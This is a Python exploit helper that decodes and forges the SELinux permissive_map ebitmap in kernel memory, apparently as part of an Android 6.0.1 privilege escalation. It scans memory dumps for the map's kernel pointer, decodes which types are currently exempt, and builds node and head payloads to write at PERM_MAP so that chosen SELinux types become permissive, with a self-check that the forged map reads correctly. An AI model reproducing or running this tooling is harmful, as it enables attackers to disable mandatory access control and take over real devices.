#!/usr/bin/env python3
"""policydb.permissive_map decoder/builder for the 3.18 selinux ebitmap, kept deliberately pure so it
can be tested against tools/ebitmap_map.h (the header the ON-DEVICE 6.0.1 escalation compiles) without
a phone in the loop.

Two subcommands:
  decode  --head <32 words hex>  [--node <hex> ...]      -> what the live map currently exempts
  build   --bits 192,279,... [--existing <decoded json>]  -> node payloads + head payload to write

Layout (from tools/ebitmap_map.h, validated on 6.0.1 by comparing the C bytes with the python bytes):
  head : node_ptr(u64) @ +0x00, highbit(u32) @ +0x08      [the ORDER is confirmed at run time by
          looking at which of the two reads back as a kernel pointer -- we do not trust the order]
  node : next(u64) @ +0x00, maps[6](48 B) @ +0x08..0x2f, startbit(u32) @ +0x38      -> 64 B
  a node covers bits [startbit, startbit+384); the chain must be ASCENDING in startbit, because
  ebitmap_get_bit stops walking as soon as n->startbit > bit.
"""
import argparse, json, sys

SPAN = 384
NODE_BYTES = 64
MAX_NODES = 4
LONGS_PER_NODE = 6


def w2u32(words, i):
    return int(words[i], 16)


def w2u64(words, i):
    return int(words[i + 1], 16) << 32 | int(words[i], 16)


def head_layout(words):
    """Decide which cell holds the node pointer from the READ, never from the header comment."""
    a, b = w2u64(words, 0), w2u32(words, 2)
    a_ptr = 0xffffff8000000000 <= a < 0xffffffd000000000
    b_ptr = 0xffffff8000000000 <= b < 0xffffffd000000000
    if a_ptr and not b_ptr:
        return "node@+0 highbit@+8", a, b
    if b_ptr and not a_ptr:
        return "highbit@+0 node@+8", b, a
    raise ValueError("head words are ambiguous: %#x / %d -- neither reading is a lone pointer" % (a, b))


def node_bits(hex64):
    """maps[] is 6 little-endian u64 words; bit b of the node is word b//64, bit b%64."""
    out = []
    for k in range(LONGS_PER_NODE):
        word = int.from_bytes(bytes.fromhex(hex64[16 + 16 * k:16 + 16 * k + 16]), "little")
        for j in range(64):
            if (word >> j) & 1:
                out.append(k * 64 + j)
    return out


def decode_node(hex64):
    nxt = int.from_bytes(bytes.fromhex(hex64[0:16]), "little")
    start = int.from_bytes(bytes.fromhex(hex64[112:120]), "little")
    return {"next": nxt, "startbit": start, "bits": node_bits(hex64)}


def windows(bits):
    """Greedy ascending windows, exactly like ebmp_windows() in ebitmap_map.h."""
    b = sorted(set(bits))
    out, i = [], 0
    while i < len(b):
        s = b[i]
        j = i
        while j < len(b) and b[j] - s < SPAN:
            j += 1
        out.append((s, b[i:j]))
        i = j
    if len(out) > MAX_NODES:
        raise ValueError("bits need %d windows, only %d nodes fit in the host buffer" % (len(out), MAX_NODES))
    return out


def node_bytes(next_ptr, startbit, bits):
    buf = bytearray(NODE_BYTES)
    buf[0:8] = next_ptr.to_bytes(8, "little")
    buf[56:60] = startbit.to_bytes(4, "little")
    for bit in bits:
        off = bit - startbit
        assert 0 <= off < SPAN, "bit %d outside window starting at %d" % (bit, startbit)
        word = off // 64
        byte = 8 + word * 8 + (off % 64) // 8
        buf[byte] |= 1 << (off % 8)
    return bytes(buf)


def get_bit(nodes, highbit, bit):
    """Mirror of ebitmap_get_bit over our own structures -- the second, independent implementation
    the delivery gate needs (the C header is the first)."""
    if highbit < bit:
        return 0
    for start, bits in nodes:
        if start > bit:
            break
        if start + SPAN > bit:
            return 1 if bit in bits else 0
    return 0


def main():
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)
    d = sub.add_parser("decode")
    d.add_argument("--head", required=True, help="32 space-separated hex words read at PERM_MAP")
    d.add_argument("--node", action="append", default=[], help="64-byte node as 128 hex chars, in chain order")
    b = sub.add_parser("build")
    b.add_argument("--bits", required=True)
    b.add_argument("--base", required=True, help="address where node 0 will live")
    b.add_argument("--keep", default="", help="comma list of bits already exempt (we add to them, never drop)")
    b.add_argument("--order", default="node@0", help="head cell order, as found by the read")
    f = sub.add_parser("find")
    f.add_argument("--hex", required=True, help="32 space-separated words read at --at")
    f.add_argument("--at", required=True, help="the address those words start at")
    f.add_argument("--lo", type=int, default=0x150, help="smallest plausible highbit")
    f.add_argument("--hi", type=int, default=0x1200, help="largest plausible highbit (type count)")
    n = sub.add_parser("node")
    n.add_argument("--hex", required=True, help="one node as 128 hex chars")
    a = ap.parse_args()

    if a.cmd == "find":
        w = a.hex.split()
        at = int(a.at, 16)
        IN = lambda v: 0xffffff8000000000 <= v < 0xffffffd000000000
        for i in range(len(w) - 1):
            a0, a1 = int(w[i], 16), int(w[i + 1], 16)
            pair = a1 << 32 | a0
            nxt = int(w[i + 2], 16) if i + 2 < len(w) else 0
            # order 1: node(u64) then highbit(u32)
            if IN(pair) and a.lo <= nxt <= a.hi:
                print("CANDIDATE addr=%#x order=node@0 highbit=%d node=%#x" % (at + 4 * i, nxt, pair))
            # order 2: highbit(u32) + pad then node(u64)
            if a0 == 0 and a.lo <= a1 <= a.hi and i + 2 < len(w):
                p2 = int(w[i + 3], 16) << 32 | int(w[i + 2], 16)
                if IN(p2):
                    print("CANDIDATE addr=%#x order=highbit@0 highbit=%d node=%#x" % (at + 4 * i, a1, p2))
        return

    if a.cmd == "node":
        d = decode_node(a.hex)
        bits = sorted(x + d["startbit"] for x in d["bits"])
        print("NODE STARTBIT=%d NEXT=%#x BITS=%s" % (d["startbit"], d["next"], ",".join(str(x) for x in bits)))
        return

    if a.cmd == "decode":
        words = a.head.split()
        if len(words) < 4:
            raise SystemExit("need at least 4 words for the head")
        order, node_ptr, highbit = head_layout(words)
        print("  head reading: %s  node=%#x  highbit=%d" % (order, node_ptr, highbit))
        print("HEAD_LAYOUT=%s NODEPTR=%#x HIGHBIT=%d" % (order, node_ptr, highbit))
        allbits = []
        for i, nh in enumerate(a.node):
            n = decode_node(nh)
            allbits += [x + n["startbit"] for x in n["bits"]]
            print("  node %d: startbit=%d next=%#x bits=%s" % (i, n["startbit"], n["next"],
                                                               sorted(x + n["startbit"] for x in n["bits"])))
            print("NODE %d STARTBIT=%d NEXT=%#x BITS=%s" % (i, n["startbit"], n["next"],
                  ",".join(str(x + n["startbit"]) for x in sorted(n["bits"]))))
        print("  currently exempt (%d): %s" % (len(allbits), sorted(allbits) if allbits else "none"))
        print("EXISTING=%s" % ",".join(str(x) for x in sorted(allbits)))
        return

    want = sorted({int(x) for x in a.bits.split(",") if x.strip()})
    keep = sorted({int(x) for x in a.keep.split(",") if x.strip()})
    bits = sorted(set(want) | set(keep))
    if not keep:
        print("  NOTE: building from scratch -- any live permissive bit NOT in this list is being dropped",
              file=sys.stderr)
    base = int(a.base, 16)
    wins = windows(bits)
    payloads, nodes = [], []
    for i, (s, grp) in enumerate(wins):
        nxt = base + NODE_BYTES * (i + 1) if i + 1 < len(wins) else 0
        pay = node_bytes(nxt, s, grp)
        payloads.append(pay.hex())
        nodes.append((s, set(grp)))
        print("  node %d @%#x : startbit=%d next=%#x bits=%s" % (i, base + NODE_BYTES * i, s, nxt, sorted(grp)))
    head = bytearray(16)
    if a.order.startswith("node"):
        head[0:8] = base.to_bytes(8, "little")
        head[8:12] = max(bits).to_bytes(4, "little")
    else:
        head[0:4] = max(bits).to_bytes(4, "little")
        head[8:16] = base.to_bytes(8, "little")
    print("  head @PERM_MAP : %s" % bytes(head).hex())
    # self-check with the independent get_bit mirror: every wanted bit reads, its neighbours do not
    hb = max(bits)
    miss = [x for x in want if not get_bit(nodes, hb, x)]
    leak = [x for x in (min(want) - 1, max(want) + 1) if 0 <= x and get_bit(nodes, hb, x)]
    print("  self-check: wanted-but-missing=%s neighbour-should-not-read=%s" % (miss or "none", leak or "none"))
    if miss or leak:
        raise SystemExit("built map fails its own get_bit mirror")
    print(json.dumps({"nodes": payloads, "node_base": hex(base), "head": bytes(head).hex(),
                      "highbit": hb, "bits": bits}))


if __name__ == "__main__":
    main()
